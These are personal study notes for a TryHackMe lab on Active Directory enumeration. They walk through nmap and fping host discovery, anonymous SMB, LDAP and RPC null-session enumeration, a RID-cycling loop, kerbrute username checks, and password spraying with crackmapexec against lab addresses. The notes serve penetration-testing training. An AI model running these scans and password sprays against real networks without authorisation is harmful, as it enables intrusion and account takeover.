https://tryhackme.com/room/adbasicenumeration

### Table of contents
- [[#Mapping Out Network]]
- [[#Network Enumeration with SMB]]
- [[#Domain Enumeration]]
- [[#Password Spraying]]

___
### Mapping Out Network
[[#Table of contents|Back to the top]]

VPN access to AD, no credentials yet
Goals: discover AD environment structure, identify hosts, map out network
Scope: `10.211.10.0/24` subnet

##### Host Discovery

**`fping`**
`fping -agq 10.211.10.0/24`
- `a`: alive systems
- `g`: generate list
- `q`: quiet (not verbose)

`10.211.11.1`: gateway
`10.211.11.250`: server
--> don't add these to the results

Add other addresses to `hosts.txt` for subsequent use (one address per line)

**`nmap`**
`nmap -sn 10.211.11.0/24`: ping scan, no port scan

##### Port Scanning

Identify DC (Domain Controller) --> determine which AD-related services are used and can be exploited

Common AD ports-protocols

| Port | Protocol           | What it Means                                 |
| ---- | ------------------ | --------------------------------------------- |
| 88   | Kerberos           | Potential for Kerberos-based enumeration      |
| 135  | MS-RPC             | Potential for RPC enumeration (null sessions) |
| 139  | SMB/NetBIOS        | Legacy SMB access                             |
| 389  | LDAP               | LDAP queries to AD                            |
| 445  | SMB                | Modern SMB access, critical for enumeration   |
| 464  | Kerberos (kpasswd) | Password-related Kerberos service             |

`nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt`
- `sV`: version detection
- `sC`: NSE (Nmap Scripting Engine) in default category
- `iL`: read target hosts from file

DC will often have 88 (Kerberos), 389 (LDAP), 445 (SMB) open, with banners like "Windows Server" / domain names revealed in nmap output

More exhaustive assessment
`nmap -sS -p- -T3 -iL hosts.txt -oN full_port_scan.txt`
- `sS`: TCP SYN scan, stealthier than full connect scan
- `-p-`: all 65 535 TCP ports
- `-T3`: "normal" timing template
- `-oN full_port_scan.txt`: outputs results to file

___
### Network Enumeration with SMB
[[#Table of contents|Back to the top]]

Enumerate network shares with SMB (Server Message Block)

##### Services

MS Windows and AD-related ports
- `88` (Kerberos): authentication --> ticket attacks like Pass-the-Ticket and Kerberoasting
- `135` (RPC Endpoint Mapper): Remote Procedure Calls --> identify services for lateral movement / RCE via DCOM
- `139` (NetBIOS Session Service): file sharing in older Windows systems --> null sessions, information gathering
- `389` (LDAP): Lightweight Directory Access Protocol, in plaintext --> enumerating AD objects, users, policies
- `445` (SMB): file sharing, remote admin --> EternalBlue, SMB relay attacks, credential theft
- `636` (LDAPS): Secure LDAP, encrypted, can still expose AD structure if misconfigured --> certificate-based attacks like AD CS exploitation

##### SMB Shares

**1. Enumerate**
*No credentials --> try to connect to a share anonymously ("null session")*

`smbclient -L //10.211.11.10 -N`
- `L`: list shares
- `N`: null session

(smbmap is Python-based)
`PATH/TO/smbmap -H 10.211.11.10`

`nmap -p445 --script smb-enum-shares 10.211.11.10`


**2. Access**
*Shares with READ, WRITE rights should be accessible*

`smbclient //10.211.11.10/share_name -N`: connect to share
`get file_name`: download file to attacker machine

If credentials found --> `--user=username --password=password` or `-U 'username%password`
Domain accounts: specify `-W`

**Other Tools**
`impacket-smbclient`: Python implementation of `smbclient`
[CrackMapExec](https://www.kali.org/tools/crackmapexec/): not only for post-exploitation, also enumeration, SMB modules, listing shares, testing credentials, ...
`enum4linux`/`enum4linux-ng`: extensive SMB enumeration

___
### Domain Enumeration
[[#Table of contents|Back to the top]]

##### LDAP Enumeration -- Anonymous Bind

Test for anonymous LDAP bind:
`ldapsearch -x -H ldap://10.211.11.10 -s base`
- `x`: simple authentication
- `H`: specify LDAP server
- `s`: only base object, no subtree/children

If successful, query user information
`ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=person)"`

##### `enum4linux-ng`
*Automated enumeration against Windows, uses SMB and RPC --> users, groups memberships, shares*

`enum4linux-ng -A 10.211.11.10 -oA results.txt`
- `A`: all enumeration functions
- `oA`: output to YAML and JSON files

##### RPC Enumeration -- Null Sessions

MSRPC (Microsoft Remote Procedure Call): program on one computer can request services from program on another computer, SMB protocol, if null sessions allowed --> access to IPC$ share --> users, groups, shares, ...

`rpcclient -U "" 10.211.11.10 -N`
- `U`: username, left blank for null session testing
- `N`: no password prompt

If successful, enumerate users
`enumdomusers` (`help` to see list of available commands)

##### RID Cycling

In AD, RID (Relative Identifier): unique identifier for user and group objects, components of SID (Security Identifier) which uniquely identify object within domain

`500` -- Administrator account, `501` -- Guest account, `512-514` -- Domain Admins, Domain users, Domain guests, user accounts typically $\geq$ `1000`

`enum4linux-ng` can be used to determine RID range / test for known ranges, then increment

```Shell
for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done
```
Useful when `enumdomusers` is restricted

##### Kerbrute -- Username Enumeration

Kerberos: primary authentication protocol for MS Windows domains
Ticket-based system managed by 3rd party -- KDC (Key Distribution Center), strong encryption

Usernames returned by `enum4linux-ng` and `rpcclient` may be: disabled accounts, non-domain accounts, fake honeypot users, false positives

--> Run them through `kerbrute` --> confirm real and active before password spraying

Set up
[https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)
`mv kerbrute_linux_amd64 kerbrute`
`chmod +x kerbrute`

___
### Password Spraying
[[#Table of contents|Back to the top]]

*Small set of common passwords tested against many accounts, avoids account lockout*

Common password lists for spraying
- Seasonal passwords
- Default IT teams passwords (`Password123`)
- `rockyou.txt`

##### Password Policy
*Indicates password length, complexity, number of failed attempts before lockout*

`rpcclient -U "" 10.211.11.10 -N`

`getdompwinfo`: get password policy

**`crackmapexec`**: enumeration, command execution, post-exploitation in Windows
`crackmapexec smb 10.211.11.10 --pass-pol`: retrieve password policy without credentials

##### The Attack

Create small list of common passwords based on gathered info

Results
- `rpcclient`: `password_properties: 0x00000001`
- `crackmapexec`: `Password Complexity Flags: 000001`
--> password complexity = 1

--> 3/4 conditions need to be respected
- Uppercase
- Lowercase
- Digit
- Special character

And cannot contain user's account name / parts of full name exceeding 2 consecutive characters
([more](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994562\(v=ws.11\)) about MS password policies)

Through OSINT, we could discover data breach, known passwords variations of "Password"
--> list: "Password!", "Password1", "Password1!", "P@ssword", "Pa55word1"
Save to `passwords.txt`

`crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt`